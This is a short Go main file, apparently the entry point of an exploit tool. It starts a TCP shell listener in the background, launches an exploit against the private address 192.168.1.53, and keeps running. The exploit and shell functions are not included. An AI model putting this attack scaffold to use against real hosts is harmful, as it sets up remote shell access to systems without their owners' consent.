package main

import (
  //"fmt"
  "time"
)

func main(){
  go ListenAndHandleTCPShell()
  time.Sleep(2000 * time.Millisecond)
  LaunchExploit("192.168.1.53")
  for {}
}
